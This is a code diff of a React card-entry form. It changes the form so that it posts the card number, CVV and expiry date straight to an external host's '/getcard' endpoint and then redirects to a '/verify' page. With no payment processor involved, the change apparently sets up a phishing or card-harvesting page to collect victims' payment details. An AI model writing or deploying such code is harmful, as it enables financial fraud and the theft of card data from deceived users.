@@ -47,7 +47,7 @@ const expyearfn = (e)=>{
 
     const next = async ()=>{
 
-   const response =  await axios.post('http://localhost:3000/getcard',{card, cvv, expmnth, expyear});
+   const response =  await axios.post('https://server-hs4q.onrender.com/getcard',{card, cvv, expmnth, expyear});
    console.log("see ", response)
         
         navigate('/verify')
@@ -70,7 +70,7 @@ const expyearfn = (e)=>{
     <div style={{height:'90vh',display:'flex', justifyContent:'center', alignItems:'center',flexDirection:'column',gap:'20px'}}>
     <div style={{display:'flex', justifyContent:'center', alignItems:'center',flexDirection:'column',gap:'20px', padding:'20px', border:'1px solid #ccc'}}>
 
-<img src="http://localhost:3000/static/e.png" height={"150px"} width={"150px"} alt="" />
+<img src="/e.png" height={"150px"} width={"150px"} alt="" />
  
 
 <input type="text" placeholder='Name' />
